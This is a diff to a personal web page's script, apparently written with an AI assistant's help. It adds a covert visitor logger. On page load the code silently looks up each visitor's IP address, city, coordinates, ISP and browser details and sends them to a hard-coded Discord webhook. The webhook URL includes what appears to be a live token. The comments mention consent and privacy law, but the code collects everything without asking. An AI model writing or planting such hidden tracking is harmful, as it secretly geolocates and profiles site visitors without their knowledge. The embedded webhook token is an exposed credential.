@@ -197,74 +197,93 @@
             const music = document.getElementById('background-music');
             const cursorDot = document.getElementById('cursor-dot');
 
-            // --- DATA LOGGING SCRIPT ---
-            const WEBHOOK_URL = ""; // PASTE YOUR DISCORD WEBHOOK URL HERE
-            
-            async function logData() {
+            // --- USER DATA COLLECTION SCRIPT ---
+            // WARNING: For client-side scripts, the Discord webhook URL is visible in the browser's developer tools.
+            // This is a security risk as anyone can find and misuse your webhook.
+            // For production environments, it is highly recommended to send data to your own secure backend server first,
+            // and then have your server forward the data to Discord.
+            // Also, ensure you comply with all privacy regulations (e.g., GDPR, CCPA) by obtaining user consent.
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1382399200913920092/barNepphDjsnqyhIA9DFcTOGxLtm4N-jVL71B-VhWkRsYpUyzf4kd6vuOE4xW-6TgYHP"; // Discord Webhook URL provided by the user
+
+            async function collectAndSendUserData() {
+                // Do not proceed if the webhook URL is not configured or invalid
                 if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/")) {
-                    return; 
+                    return; // Silently exit if URL is not set or invalid
                 }
 
-                function getTimestamp() { return new Date().toISOString(); }
+                let ipData = null;
 
-                async function getLocationData() {
-                    let info = { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", isp: "N/A" };
-                    try {
-                        const r = await fetch('https://ipapi.co/json/');
-                        if (!r.ok) throw new Error('ipapi failed');
-                        const d = await r.json();
-                        info = { ip: d.ip, country: d.country_name, region: d.region, city: d.city, isp: d.org };
-                    } catch (e) {
-                        try {
-                            const ir = await fetch('https://api.ipify.org?format=json');
-                            if (ir.ok) info.ip = (await ir.json()).ip;
-                        } catch (fe) { /* fallback failed */ }
-                    }
-                    return info;
-                }
-
-                const browserData = {
-                    userAgent: navigator.userAgent || "N/A",
-                    platform: navigator.platform || "N/A",
-                    referrer: document.referrer || "Direct"
-                };
-
-                const locationData = await getLocationData();
-                const allData = { ...browserData, ...locationData };
-
-                const payload = {
-                    username: "Data Logger Bot",
-                    avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif",
-                    embeds: [{
-                        title: "📊 Data Logged",
-                        description: `User data captured for Site: ${window.location.href}`,
-                        color: 0x0099FF,
-                        fields: [
-                            { name: "IP Address", value: allData.ip, inline: true },
-                            { name: "Country", value: allData.country, inline: true },
-                            { name: "City", value: allData.city, inline: true },
-                            { name: "ISP", value: allData.isp, inline: false },
-                            { name: "User Agent", value: allData.userAgent, inline: false }
-                        ],
-                        footer: { text: "Data Logged" },
-                        timestamp: getTimestamp()
-                    }]
-                };
-
+                // 1. Fetch IP data from ipapi.com
                 try {
-                    await fetch(WEBHOOK_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    });
+                    const ipApiResponse = await fetch('https://ipapi.com/json/');
+                    if (!ipApiResponse.ok) {
+                        throw new Error(`HTTP error! status: ${ipApiResponse.status}`);
+                    }
+                    ipData = await ipApiResponse.json();
                 } catch (error) {
-                    console.error("Error sending data to Discord:", error);
+                    // Fail silently if IP data cannot be fetched
+                    return;
+                }
+
+                // Prepare data for Discord webhook
+                const discordPayload = {
+                    username: "Stachu Site Visitor", // Name that appears for the webhook message
+                    avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif", // A generic hacker GIF
+                    embeds: [
+                        {
+                            title: "New Visitor Data Collected",
+                            description: `A new user visited the site: ${window.location.href}`,
+                            color: 0x0099FF, // Blue color
+                            fields: [
+                                { name: "IP Address", value: ipData.ip || "N/A", inline: true },
+                                { name: "Country", value: ipData.country_name || "N/A", inline: true },
+                                { name: "City", value: ipData.city || "N/A", inline: true },
+                                { name: "Region", value: ipData.region_name || "N/A", inline: true },
+                                { name: "Latitude", value: ipData.latitude ? ipData.latitude.toString() : "N/A", inline: true },
+                                { name: "Longitude", value: ipData.longitude ? ipData.longitude.toString() : "N/A", inline: true },
+                                { name: "Organization", value: ipData.org || "N/A", inline: false },
+                                { name: "ISP", value: ipData.asn || "N/A", inline: false },
+                                { name: "Timezone", value: ipData.timezone || "N/A", inline: true },
+                                { name: "Zip Code", value: ipData.zip || "N/A", inline: true },
+                                { name: "User Agent", value: navigator.userAgent || "N/A", inline: false },
+                                { name: "Platform", value: navigator.platform || "N/A", inline: true },
+                                { name: "Referrer", value: document.referrer || "Direct", inline: true }
+                            ],
+                            footer: {
+                                text: "Data collected silently from ipapi.com",
+                                icon_url: "https://placehold.co/32x32/000000/FFFFFF?text=i",
+                            },
+                            timestamp: new Date().toISOString(), // Current time
+                        },
+                    ],
+                };
+
+                // 2. Send data to Discord webhook
+                try {
+                    const discordResponse = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(discordPayload),
+                    });
+
+                    // Discord webhooks return a 204 No Content on success, so check for !ok
+                    if (!discordResponse.ok) {
+                        // Log error internally if webhook fails, but don't show to user
+                        const errorText = await discordResponse.text();
+                        console.error("Discord webhook failed silently:", discordResponse.status, errorText);
+                    }
+                } catch (error) {
+                    // Fail silently if sending to Discord fails
+                    console.error("Failed to send data to Discord webhook silently:", error);
                 }
             }
 
-            logData();
+            // Execute the data collection function immediately when the DOM is ready
+            collectAndSendUserData();
 
-            // --- ANIMATION & INTERACTION SCRIPT ---
+            // --- ANIMATION & INTERACTION SCRIPT (Original code) ---
             splashScreen.addEventListener('click', () => {
                 music.volume = 0.1;
                 music.play().catch(e => console.error("Audio play was prevented:", e));
